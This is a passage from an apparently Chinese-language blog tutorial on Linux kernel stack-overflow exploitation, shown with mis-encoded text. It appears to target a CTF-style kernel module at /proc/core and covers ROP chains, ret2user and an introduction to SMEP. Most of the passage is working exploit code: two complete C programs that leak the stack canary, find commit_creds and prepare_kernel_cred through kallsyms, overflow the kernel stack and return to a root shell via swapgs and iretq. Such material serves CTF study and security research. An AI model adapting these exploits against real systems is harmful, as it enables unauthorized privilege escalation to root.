<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ <code>pop rdi ; ret</code> è¿™ä¸ª <code>gadget</code> æ¥æ§åˆ¶ <code>prepare_kernel_cred</code> å‡½æ•°çš„å‚æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æˆåŠŸæœåˆ°è¿™ä¸ª <code>gadget</code> ï¼Œä½†é—®é¢˜åœ¨äºæ²¡æœ‰ <code>mov rdi,rax ; ret</code> è¿™ä¸ª <code>gadget</code> æ¥ä¼ é€’ç»™ <code>commit_creds</code> å‡½æ•°å‚æ•°ï¼Œé€šè¿‡æœç´¢å‘ç°å…·æœ‰ä¸€ä¸ª <code>mov rdi, rax ; jmp rdx</code> è¿™ä¸ª <code>gadget</code> ï¼Œå¹¶ä¸”å­˜åœ¨ <code>pop rdx ; ret</code> æ¥æ§åˆ¶ <code>rdx</code> ï¼Œå› æ­¤ <code>rop</code> é“¾çš„å¸ƒç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br></pre></td></tr></table></figure>



<p>æ­¤æ—¶ <code>commit_creds(prepare_kernel_cred(0))</code> æ‰§è¡Œå®Œæ¯•ï¼Œä½†éœ€è¦æ¥ç¨³å›ºç¨‹åºï¼Œå› ä¸ºåœ¨å†…æ ¸æ€æ ˆæº¢å‡ºåï¼Œæ ˆä¸­çš„ä¸€äº›æ•°æ®è¢«æŸåï¼Œå…¶ä¸­åŒ…æ‹¬äº†ç”¨æˆ·æ€çš„çŠ¶æ€ä¿¡æ¯ï¼Œä¸€æ—¦æŸå¤±äº†è¿™äº›ä¿¡æ¯ï¼Œé‡æ–°åˆ‡æ¢åˆ°ç”¨æˆ·æ€æ—¶ç³»ç»Ÿå°±ä¼šå´©æºƒã€‚æ‰€ä»¥æˆ‘ä»¬è¦åœ¨æ”»å‡»ä¹‹å‰å…ˆä¿å­˜ä¸€ä¸‹çŠ¶æ€ä¿¡æ¯ï¼Œå°†å…¶æ„é€ åœ¨å†…æ ¸æ ˆä¸­ï¼Œæœ€åè¿”å›çš„æ—¶å€™å°±æ˜¯æ­£å¸¸çš„ã€‚</p>
<p>ç³»ç»Ÿæƒé™åˆ†ä¸ºå†…æ ¸æ€å’Œç”¨æˆ·æ€ï¼Œåˆ†ç¦»çš„å®ç°æ˜¯ <code>swapgs</code> æŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤å°† <code>gs</code> å¯„å­˜å™¨çš„å€¼ä¸ <code>IA32_KERNEL_GS_BASE MSR</code> åœ°å€ä¸­çš„å€¼äº¤æ¢ã€‚å†…æ ¸æ€å¸¸è§„æ“ä½œï¼ˆå¦‚ç³»ç»Ÿè°ƒç”¨ï¼‰çš„å…¥å£å¤„ï¼Œæ‰§è¡Œ <code>swapgs</code> æŒ‡ä»¤è·å¾—æŒ‡å‘å†…æ ¸æ•°æ®ç»“æ„çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆå¯¹åº”çš„ï¼Œ ä»å†…æ ¸æ€é€€å‡ºï¼Œè¿”å›åˆ°ç”¨æˆ·æ€æ—¶ä¹Ÿéœ€æ‰§è¡Œä¸€ä¸‹ <code>swapgs</code> </p>
<p><code>iretq</code> æŒ‡ä»¤ç”¨æ¥æ¢å¤ç”¨æˆ·ç©ºé—´ï¼Œå®ƒä¼šä»æ ˆä¸­å¼¹å‡ºå·²ç»ä¿å­˜çš„ <code>RIP</code> <code>CS</code> <code>RFLAGS</code> <code>RSP</code> <code>SS</code> æ¢å¤ä¹‹å‰çš„æ‰§è¡Œç¯å¢ƒï¼Œæ‰€ä»¥æœ€åæ‰§è¡Œ <code>iretq</code> æŒ‡ä»¤ï¼Œæ¢å¤æœ€å¼€å§‹ä¿å­˜çš„å¯„å­˜å™¨å€¼å³å¯ã€‚</p>
<p>æ‰€ä»¥ <code>ROP</code> é“¾çš„éƒ¨åˆ†ä¸º</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">rop[i++] = user_ss;<span class="comment">//SS</span></span><br></pre></td></tr></table></figure>



<p>ä¸‹é¢ä¸¤å¼ å›¾ç‰‡æ˜¯ <code>iretq</code> æŒ‡ä»¤æ‰§è¡Œå‰åçš„æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°å·²ç»ä»å†…æ ¸æ€åˆ‡æ¢åˆ°äº†ç”¨æˆ·æ€ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840059.png" alt="image-20230408183923247"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840996.png" alt="image-20230408183934789"></p>
<p>å› ä¸º <code>RIP</code> è®¾ç½®çš„æ˜¯ç”¨æˆ·æ€ä¸­ <code>system(&quot;/bin/sh&quot;)</code> çš„åœ°å€ï¼Œå› æ­¤å¼€å¯äº†æ–°çš„ <code>root shell</code> ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081843627.png" alt="image-20230408184359505"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">   rop[i++]=commit_creds;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line">   </span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><p><code>ret2user</code> å’Œä¸Šé¢çš„ <code>ROP</code> éå¸¸ç›¸ä¼¼ï¼ˆæ¯•ç«Ÿæœ¬è´¨ä¸Šè¿˜æ˜¯ <code>ROP</code> ï¼‰ï¼Œç»™æˆ‘çš„æ„Ÿè§‰æ˜¯ <code>ret2user</code> åœ¨æ§åˆ¶å‚æ•°æ–¹é¢æœ‰å¾ˆå¤§çš„ä¼˜åŠ¿ï¼Œå®ƒæ˜¯å°†æ‰§è¡Œæµè¿”å›åˆ°äº†ç”¨æˆ·æ€ä¸­å¸ƒç½®çš„å‡½æ•°ä¸Šï¼Œè™½ç„¶æ‰§è¡Œçš„å‡½æ•°æ˜¯ä½äºå†…æ ¸ç©ºé—´ï¼Œä½†å› ä¸ºæˆ‘ä»¬çš„æƒé™æ˜¯ <code>ring 0</code>ï¼Œå› æ­¤ä¾ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œã€‚å…¶æ ¹æœ¬åŸå› æ˜¯å› ä¸ºå†…æ ¸ç©ºé—´å¯ä»¥è®¿é—®ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ï¼ˆåä¹‹åˆ™ä¸è¡Œï¼‰ï¼Œä»¥å†…æ ¸çš„æƒé™æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç å®Œæˆææƒï¼ˆå‰ææ˜¯æ²¡æœ‰å¼€å¯ <code>SMEP</code> ä¿æŠ¤ï¼‰</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] ret2user [*]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸¤ä»½ <code>EXP</code> å…¶å®å¾ˆåƒï¼Œåªæœ‰æ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(0))</code> å‡½æ•°çš„éƒ¨åˆ†ä¸ä¸€æ ·ï¼ˆå¦‚ä¸‹ï¼‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æœ‰æ„æ€çš„æ˜¯ï¼Œæ— æ³•åœ¨æ­¤å¤„æ‰§è¡Œç”¨æˆ·æ€çš„å‡½æ•°ï¼Œå› ä¸ºæˆ‘è°ƒç”¨äº† <code>puts</code> å‡½æ•°ï¼Œå‘ç°å†…æ ¸å´©æºƒäº†ï¼Œæˆ‘è®¤ä¸ºå…¶åŸå› æ˜¯çŠ¶æ€å¯„å­˜å™¨æ²¡æœ‰è¿›è¡Œåˆ‡æ¢æ‰€å¯¼è‡´çš„ï¼Œå› æ­¤è¿˜å¾—å†å›åˆ°å†…æ ¸ä¸­å»æ¢å¤çŠ¶æ€å¯„å­˜å™¨çš„å€¼ï¼Œæœ€ç»ˆæ‰§è¡Œç”¨æˆ·æ€ä¸­çš„ <code>system(&quot;/bin/sh&quot;)</code> </p>
<h2 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass-SMEP"></a>bypass-SMEP</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><code>SMEP</code> å…¨ç§° <code>Supervisor Mode Execution Protection</code> ï¼Œå½“ <code>CPU</code> å¤„äº <code>ring0</code> æ¨¡å¼æ—¶æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ä¼šè§¦å‘é¡µé”™è¯¯ï¼ˆè¯¥é˜²å¾¡æœºåˆ¶ä¼šå°†é¡µè¡¨ä¸­çš„ç”¨æˆ·ç©ºé—´å†…å­˜é¡µæ ‡è®°ä¸ºä¸å¯æ‰§è¡Œï¼‰ï¼Œç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ <code>ret2user</code>ã€‚åœ¨å¯åŠ¨æ—¶ï¼Œ <code>-cpu</code> é€‰é¡¹ä¸‹åŠ å…¥ <code>+smep</code> å¯ç”¨è¯¥é˜²å¾¡æœºåˆ¶ï¼Œåœ¨ <code>-append</code> é€‰é¡¹ä¸‹åŠ å…¥ <code>nosmep</code> ç¦ç”¨è¯¥æœºåˆ¶ã€‚</p>
